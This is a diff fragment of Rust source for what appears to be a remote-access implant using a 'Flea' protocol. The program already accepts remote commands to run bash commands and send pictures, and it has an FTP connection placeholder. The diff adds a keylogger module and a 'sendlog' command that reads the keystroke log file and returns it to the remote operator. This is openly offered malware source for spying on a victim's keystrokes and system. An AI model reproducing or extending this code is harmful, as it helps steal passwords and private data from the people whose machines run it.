@@ -13,11 +13,13 @@ use std::thread;
 use std::time::Duration;
 use log::{debug, error};
 use chrono::{DateTime, Utc};
+use crate::keylogger::*;
 
 const FLEA_PROTOCOL_VERSION: u8 = 1;
 const GET_VERSION_COMMAND: &'static str = "version";
 const EXECUTE_BASH_COMMAND: &'static str = "bash";
 const SEND_PIC_COMMAND: &'static str = "pic";
+const SEND_KEY_LOGGER_FILE_COMMAND: &'static str = "sendlog";
 const UNKNOWN_COMMAND: &'static str = "Unknown command";
 
 //Enter your data for FTP Server connection
@@ -282,6 +284,18 @@ impl FleaCommand for CommandProcessor
             EXECUTE_BASH_COMMAND =>
             {
                 return self.execute_bash_command(value);
+            },
+
+            SEND_KEY_LOGGER_FILE_COMMAND =>
+            {
+                if let Ok(x) = env::current_dir() 
+                {
+                    let current_path = x.join(KEY_LOGGER_FILE_NAME).to_str().unwrap().to_string();
+                    return get_key_logger_content(&current_path);
+                };
+
+                error!("Get current firectory failed!");
+                return "".to_string();
             },
 
             SEND_PIC_COMMAND =>
